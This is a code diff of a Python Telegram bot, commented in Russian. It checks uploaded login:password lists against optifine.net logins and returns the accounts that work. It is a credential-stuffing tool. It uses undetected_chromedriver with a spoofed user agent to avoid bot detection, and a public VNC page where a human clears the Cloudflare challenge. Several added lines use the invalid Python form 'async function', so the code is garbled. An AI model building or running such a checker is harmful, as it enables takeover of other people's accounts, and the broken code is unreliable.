@@ -13,6 +13,7 @@ import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.action_chains import ActionChains
 from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -48,16 +49,16 @@ bot_stats = {
 }
 
 # Хранилище сессий
-active_sessions = {}
+pending_sessions = {}
 
 # Создаем директории
 os.makedirs('/app/debug', exist_ok=True)
-os.makedirs('/app/sessions', exist_ok=True)
 
 class OptifineChecker:
     def __init__(self):
         self.driver = None
         self.cloudflare_passed = False
+        self.vnc_url = None
         logger.info("🚀 Инициализация OptifineChecker...")
     
     def wait_for_xvfb(self):
@@ -67,11 +68,10 @@ class OptifineChecker:
                 result = subprocess.run(['xdpyinfo', '-display', ':99'], 
                                       capture_output=True, timeout=2)
                 if result.returncode == 0:
-                    logger.info(f"✅ Xvfb готов")
+                    logger.info("✅ Xvfb готов")
                     return True
             except:
                 pass
-            logger.info(f"⏳ Ожидание Xvfb... {i+1}/10")
             time.sleep(2)
         return False
 
@@ -83,14 +83,13 @@ class OptifineChecker:
                 return False
             
             logger.info("🔍 Определяю версию Chrome...")
-            
             try:
                 chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                 chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                 logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
             except:
                 chrome_version = 145
-                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
+                logger.warning("⚠️ Использую версию по умолчанию")
             
             options = uc.ChromeOptions()
             options.add_argument('--no-sandbox')
@@ -101,10 +100,6 @@ class OptifineChecker:
             options.add_argument('--disable-blink-features=AutomationControlled')
             options.add_argument('--lang=en-US,en;q=0.9')
             options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
-            options.add_argument('--ignore-certificate-errors')
-            options.add_argument('--ignore-ssl-errors')
-            
-            logger.info(f"🚀 Запускаю undetected_chromedriver...")
             
             self.driver = uc.Chrome(
                 options=options,
@@ -114,16 +109,86 @@ class OptifineChecker:
             
             self.driver.set_page_load_timeout(60)
             self.driver.implicitly_wait(10)
-            
-            # Тестовый скриншот
-            self.driver.save_screenshot('/app/debug/test_screenshot.png')
-            logger.info("📸 Тестовый скриншот сохранен")
-            
             logger.info("✅ Драйвер успешно инициализирован")
             return True
             
         except Exception as e:
             logger.error(f"❌ Ошибка инициализации: {e}")
+            return False
+
+    def get_railway_url(self):
+        """Получает публичный URL от Railway"""
+        try:
+            # Railway автоматически создает URL для порта 5900
+            # Пробуем получить из переменных окружения
+            railway_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
+            if railway_url:
+                return f"https://{railway_url}:5900"
+            
+            # Если нет, пробуем через метаданные
+            import requests
+            metadata = requests.get('http://metadata.railway.internal/').json()
+            hostname = metadata.get('hostname')
+            if hostname:
+                return f"https://{hostname}.railway.app:5900"
+            
+            return None
+        except:
+            return None
+
+    async def setup_web_access(self, update, context):
+        """Настраивает веб-доступ к браузеру"""
+        try:
+            session_id = f"{update.effective_user.id}_{int(time.time())}"
+            
+            # Получаем URL от Railway
+            web_url = self.get_railway_url()
+            
+            if not web_url:
+                # Если не получилось, показываем инструкцию
+                web_url = "НУЖНО ДОБАВИТЬ ПОРТ 5900 В RAILWAY"
+            
+            keyboard = [
+                [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"web_done_{session_id}")],
+                [InlineKeyboardButton("🔄 Проверить статус", callback_data=f"web_status_{session_id}")],
+                [InlineKeyboardButton("❌ Отмена", callback_data=f"web_cancel_{session_id}")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            # Открываем страницу
+            self.driver.get("https://optifine.net/login")
+            time.sleep(3)
+            
+            # Сохраняем скриншот для проверки
+            self.driver.save_screenshot('/app/debug/initial_page.png')
+            
+            # Отправляем инструкцию
+            await update.message.reply_text(
+                f"🖥️ **БРАУЗЕР ЗАПУЩЕН**\n\n"
+                f"🔗 **ТВОЯ ССЫЛКА ДЛЯ ДОСТУПА:**\n"
+                f"`{web_url}/vnc.html`\n\n"
+                f"📱 **ЧТО ДЕЛАТЬ:**\n"
+                f"1️⃣ Открой эту ссылку в браузере на телефоне\n"
+                f"2️⃣ Нажми кнопку **Connect**\n"
+                f"3️⃣ Ты увидишь рабочий стол с браузером\n"
+                f"4️⃣ Нажми на галочку на странице\n"
+                f"5️⃣ Вернись сюда и нажми кнопку\n\n"
+                f"⏳ **Время ожидания: 5 минут**",
+                reply_markup=reply_markup
+            )
+            
+            # Сохраняем сессию
+            pending_sessions[session_id] = {
+                'user_id': update.effective_user.id,
+                'checker': self,
+                'start_time': time.time()
+            }
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка: {e}")
+            await update.message.reply_text(f"❌ Ошибка: {e}")
             return False
 
     def check_cloudflare_status(self):
@@ -152,88 +217,24 @@ class OptifineChecker:
             logger.error(f"❌ Ошибка проверки: {e}")
             return False
 
-    async def take_screenshot(self):
-        """Делает скриншот и возвращает путь к файлу"""
-        try:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"/app/debug/screenshot_{timestamp}.png"
-            self.driver.save_screenshot(filename)
-            return filename
-        except Exception as e:
-            logger.error(f"❌ Ошибка создания скриншота: {e}")
-            return None
-
-    async def setup_screenshots(self, update, context):
-        """Настраивает отправку скриншотов"""
-        try:
-            session_id = f"{update.effective_user.id}_{int(time.time())}"
-            
-            keyboard = [
-                [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"shot_done_{session_id}")],
-                [InlineKeyboardButton("📸 Новый скриншот", callback_data=f"shot_new_{session_id}")],
-                [InlineKeyboardButton("❌ Отмена", callback_data=f"shot_cancel_{session_id}")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            # Открываем страницу
-            self.driver.get("https://optifine.net/login")
-            time.sleep(5)
-            
-            # Первый скриншот
-            screenshot = await self.take_screenshot()
-            
-            if screenshot:
-                with open(screenshot, 'rb') as f:
-                    await update.message.reply_photo(
-                        photo=f,
-                        caption=f"🖥️ **Текущее состояние браузера**\n\n"
-                                f"1️⃣ Посмотри на скриншот\n"
-                                f"2️⃣ Если видишь галочку - нажми на неё\n"
-                                f"3️⃣ После этого нажми кнопку\n\n"
-                                f"⏳ **Время ожидания: 5 минут**",
-                        reply_markup=reply_markup
-                    )
-            else:
-                await update.message.reply_text(
-                    f"🖥️ **Браузер запущен**\n\n"
-                    f"Через 10 секунд придет первый скриншот.\n"
-                    f"Смотри на них и нажимай кнопку, когда увидишь что галочка пройдена.",
-                    reply_markup=reply_markup
-                )
-            
-            # Сохраняем сессию
-            active_sessions[session_id] = {
-                'user_id': update.effective_user.id,
-                'checker': self,
-                'start_time': time.time(),
-                'last_shot': time.time()
-            }
-            
-            return True
-            
-        except Exception as e:
-            logger.error(f"❌ Ошибка: {e}")
-            await update.message.reply_text(f"❌ Ошибка: {e}")
-            return False
-
     async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Обрабатывает нажатия кнопок"""
         query = update.callback_query
         await query.answer()
         
         data = query.data
-        if not (data.startswith('shot_') or data.startswith('any_')):
+        if not data.startswith('web_'):
             return
         
         parts = data.split('_')
         action = parts[1]
         session_id = parts[2] if len(parts) > 2 else None
         
-        if session_id not in active_sessions:
+        if session_id not in pending_sessions:
             await query.edit_message_text("❌ Сессия устарела")
             return
         
-        session = active_sessions[session_id]
+        session = pending_sessions[session_id]
         
         if query.from_user.id != session['user_id']:
             await query.answer("❌ Это не ваша сессия!", show_alert=True)
@@ -244,31 +245,23 @@ class OptifineChecker:
                 session['checker'].cloudflare_passed = True
                 await query.edit_message_text("✅ **Cloudflare пройден!** Продолжаю проверку...")
             else:
-                # Делаем новый скриншот
-                screenshot = await session['checker'].take_screenshot()
-                if screenshot:
-                    with open(screenshot, 'rb') as f:
-                        await context.bot.send_photo(
-                            chat_id=query.message.chat_id,
-                            photo=f,
-                            caption="❌ **Cloudflare все еще активен**\n\nПосмотри на скриншот и нажми галочку"
-                        )
-                await query.delete_message()
+                await query.edit_message_text(
+                    "❌ **Cloudflare все еще активен**\n\n"
+                    "Посмотри в браузере:\n"
+                    "• Точно ли ты нажал на галочку?\n"
+                    "• Попробуй еще раз"
+                )
         
-        elif action == 'new':
-            screenshot = await session['checker'].take_screenshot()
-            if screenshot:
-                with open(screenshot, 'rb') as f:
-                    await context.bot.send_photo(
-                        chat_id=query.message.chat_id,
-                        photo=f,
-                        caption="📸 **Новый скриншот**"
-                    )
-            await query.delete_message()
+        elif action == 'status':
+            if session['checker'].check_cloudflare_status():
+                session['checker'].cloudflare_passed = True
+                await query.edit_message_text("✅ **Cloudflare пройден!**")
+            else:
+                await query.edit_message_text("⏳ **Cloudflare еще активен**\n\nЖду...")
         
         elif action == 'cancel':
             await query.edit_message_text("❌ Операция отменена")
-            del active_sessions[session_id]
+            del pending_sessions[session_id]
 
     async def check_account(self, login: str, password: str) -> Dict:
         """Проверка аккаунта"""
@@ -343,17 +336,10 @@ class OptifineChecker:
             
             # Проверка результата
             current_url = self.driver.current_url
-            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
-            
             if 'downloads' in current_url or 'profile' in current_url:
-                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
                 return {'login': login, 'password': password, 'status': 'valid'}
-            elif 'invalid' in page_text or 'incorrect' in page_text:
-                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
-                return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
             else:
-                logger.info(f"⚠️ НЕОПРЕДЕЛЕННЫЙ: {login[:20]}")
-                return {'login': login, 'status': 'invalid', 'error': 'Неопределенный результат'}
+                return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
             
         except Exception as e:
             logger.error(f"❌ Ошибка: {e}")
@@ -376,26 +362,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Нет доступа**")
         return
     
-    uptime = datetime.now() - bot_stats['start_time']
-    hours = int(uptime.seconds // 3600)
-    minutes = int((uptime.seconds // 60) % 60)
-    
-    keyboard = [
-        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
-        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
-    ]
-    
     await update.message.reply_text(
-        f"👋 **Optifine Checker**\n\n"
-        f"📥 **Отправь .txt файл** с аккаунтами\n"
-        f"Формат: логин:пароль (каждый с новой строки)\n\n"
-        f"📌 **Пример:**\n"
-        f"`user@mail.com:password123`\n\n"
-        f"📊 **Статистика:**\n"
-        f"• Проверено: {bot_stats['total']}\n"
-        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
-        f"🔧 **Для админов:** /debug",
-        reply_markup=InlineKeyboardMarkup(keyboard)
+        "👋 **Optifine Checker**\n\n"
+        "📥 **Отправь .txt файл** с аккаунтами\n"
+        "Формат: логин:пароль (каждый с новой строки)\n\n"
+        "🔧 **Для админов:** /debug"
     )
 
 async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -406,115 +377,62 @@ async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         files = os.listdir('/app/debug')
-        if not files:
+        if files:
+            for file in files[:5]:
+                file_path = os.path.join('/app/debug', file)
+                with open(file_path, 'rb') as f:
+                    await update.message.reply_document(f, filename=file)
+        else:
             await update.message.reply_text("📁 Папка debug пуста")
-            return
-        
-        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
-        
-        sent = 0
-        for file in files[:5]:
-            file_path = os.path.join('/app/debug', file)
-            if os.path.getsize(file_path) > 10 * 1024 * 1024:
-                continue
-            with open(file_path, 'rb') as f:
-                await update.message.reply_document(
-                    document=f,
-                    filename=file,
-                    caption=f"📁 **Debug:** `{file}`"
-                )
-            sent += 1
-            await asyncio.sleep(1)
-        
-        await update.message.reply_text(f"✅ Отправлено файлов: {sent}")
-        
     except Exception as e:
         await update.message.reply_text(f"❌ Ошибка: {e}")
 
-async def process_file(file_path, update, context):
+async function process_file(file_path, update, context):
     """Обработка файла"""
     checker = OptifineChecker()
-    results = {'valid': [], 'invalid': [], 'errors': []}
+    results = {'valid': [], 'invalid': []}
     
     msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
     
     try:
-        # Читаем файл
         async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
             content = await f.read()
         
-        # Парсим аккаунты
         accounts = []
         for line in content.strip().split('\n'):
-            line = line.strip()
             if ':' in line:
                 login, password = line.split(':', 1)
                 accounts.append((login.strip(), password.strip()))
         
-        total = len(accounts)
-        if total == 0:
+        if not accounts:
             await msg.edit_text("❌ **Нет аккаунтов**")
             return
         
-        await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🖥️ **Запускаю браузер...**")
+        await msg.edit_text(f"📊 Аккаунтов: {len(accounts)}\n\n🖥️ **Запускаю браузер...**")
         
-        # Инициализация
         if not checker.init_driver():
-            await msg.edit_text("❌ **Ошибка инициализации**\n\nПроверь логи через /debug")
+            await msg.edit_text("❌ **Ошибка инициализации**")
             return
         
-        # Настройка скриншотов
-        success = await checker.setup_screenshots(update, context)
+        # Настраиваем веб-доступ
+        success = await checker.setup_web_access(update, context)
         if not success:
             checker.close()
             return
         
-        # Запускаем фоновую отправку скриншотов
-        async def send_periodic_screenshots():
-            session_id = list(active_sessions.keys())[-1] if active_sessions else None
-            if not session_id:
-                return
-            
-            while session_id in active_sessions:
-                session = active_sessions[session_id]
-                if time.time() - session.get('last_shot', 0) > 15:
-                    screenshot = await checker.take_screenshot()
-                    if screenshot:
-                        with open(screenshot, 'rb') as f:
-                            await context.bot.send_photo(
-                                chat_id=update.effective_chat.id,
-                                photo=f,
-                                caption=f"📸 Автоскриншот (каждые 15 сек)"
-                            )
-                    session['last_shot'] = time.time()
-                await asyncio.sleep(15)
-        
-        asyncio.create_task(send_periodic_screenshots())
-        
-        # Ожидание Cloudflare
-        await msg.edit_text(f"⏳ **Ожидаю прохождения Cloudflare...**\n\nСледи за скриншотами и нажми кнопку, когда галочка исчезнет")
+        await msg.edit_text("⏳ **Ожидаю прохождения Cloudflare...**\n\nПерейди по ссылке и нажми галочку")
         
         # Проверка аккаунтов
-        valid_count = 0
         for i, (login, password) in enumerate(accounts, 1):
-            if i % 3 == 0:
-                await msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {valid_count}")
-            
             result = await checker.check_account(login, password)
-            
             if result['status'] == 'valid':
                 results['valid'].append(result)
-                valid_count += 1
                 bot_stats['valid'] += 1
-            elif result['status'] == 'invalid':
-                results['invalid'].append(result)
-                bot_stats['invalid'] += 1
             else:
-                results['errors'].append(result)
+                results['invalid'].append(result)
                 bot_stats['invalid'] += 1
             
             bot_stats['total'] += 1
-            await asyncio.sleep(2)
         
         # Отправка результатов
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -525,42 +443,24 @@ async def process_file(file_path, update, context):
                 for acc in results['valid']:
                     await f.write(f"{acc['login']}:{acc['password']}\n")
             with open(valid_file, 'rb') as f:
-                await update.message.reply_document(
-                    document=f,
-                    filename=valid_file,
-                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
-                )
+                await update.message.reply_document(f, filename=valid_file)
             os.remove(valid_file)
         
-        if results['invalid']:
-            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
-            async with aiofiles.open(invalid_file, 'w') as f:
-                for acc in results['invalid']:
-                    await f.write(f"{acc['login']}:{acc['password']}\n")
-            with open(invalid_file, 'rb') as f:
-                await update.message.reply_document(
-                    document=f,
-                    filename=invalid_file,
-                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
-                )
-            os.remove(invalid_file)
-        
         await update.message.reply_text(
-            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
-            f"📊 Всего: {total}\n"
-            f"✅ Рабочих: {len(results['valid'])}\n"
-            f"❌ Нерабочих: {len(results['invalid'])}"
+            f"✅ **ГОТОВО!**\n\n"
+            f"Всего: {len(accounts)}\n"
+            f"✅ Рабочих: {len(results['valid'])}"
         )
         
     except Exception as e:
         logger.error(f"Ошибка: {e}")
-        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
+        await update.message.reply_text(f"❌ Ошибка: {e}")
     finally:
         checker.close()
         if os.path.exists(file_path):
             os.remove(file_path)
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async function handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Получение файла"""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
         await update.message.reply_text("❌ **Нет доступа**")
@@ -571,43 +471,29 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
-    try:
-        file = await context.bot.get_file(doc.file_id)
-        path = f"temp_{update.effective_user.id}_{doc.file_name}"
-        await file.download_to_drive(path)
-        await process_file(path, update, context)
-    except Exception as e:
-        logger.error(f"Ошибка: {e}")
-        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
+    file = await context.bot.get_file(doc.file_id)
+    path = f"temp_{update.effective_user.id}_{doc.file_name}"
+    await file.download_to_drive(path)
+    await process_file(path, update, context)
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async function button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработка кнопок"""
     checker = OptifineChecker()
     await checker.handle_callback(update, context)
 
 def main():
-    """Запуск"""
     print("=" * 50)
     print("🚀 ЗАПУСК OPTIFINE CHECKER")
     print("=" * 50)
-    print(f"📁 Директория отладки: /app/debug")
-    print(f"👑 Admin IDs: {ADMIN_IDS}")
-    print("=" * 50)
     
     app = Application.builder().token(TOKEN).build()
-    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("debug", debug_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
     print("✅ БОТ ЗАПУЩЕН!")
-    print("=" * 50)
-    
-    try:
-        app.run_polling()
-    except Exception as e:
-        logger.error(f"Ошибка: {e}")
+    app.run_polling()
 
 if __name__ == '__main__':
     main()
